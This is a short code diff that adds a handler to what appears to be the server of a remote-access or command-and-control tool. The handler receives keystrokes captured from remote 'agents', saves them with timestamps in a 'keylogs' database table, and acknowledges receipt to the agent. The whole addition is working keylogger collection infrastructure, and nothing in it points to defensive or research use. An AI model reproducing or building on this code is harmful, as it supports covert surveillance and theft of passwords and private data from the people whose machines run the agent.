@@ -187,3 +187,23 @@ def init_socket_handlers(socketio):
                     'status': 'success',
                     'message': 'WebSocket disconnected'
                 }, room=f"terminal_{agent_id}", namespace='/terminal')
+
+    @socketio.on('keylogger_data', namespace='/terminal')
+    def handle_keylogger_data(data):
+        if not current_user.is_authenticated:
+            return
+        agent_id = data.get('agent_id')
+        keys = data.get('keys')
+        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
+        if not agent_id or not keys:
+            return
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute("INSERT INTO keylogs (agent_id, keys, timestamp) VALUES (?, ?, ?)", (agent_id, keys, timestamp))
+            conn.commit()
+            conn.close()
+            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/terminal')
+        except Exception as e:
+            print(f"[SocketIO] Error saving keylogger data: {str(e)}")
+            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/terminal')
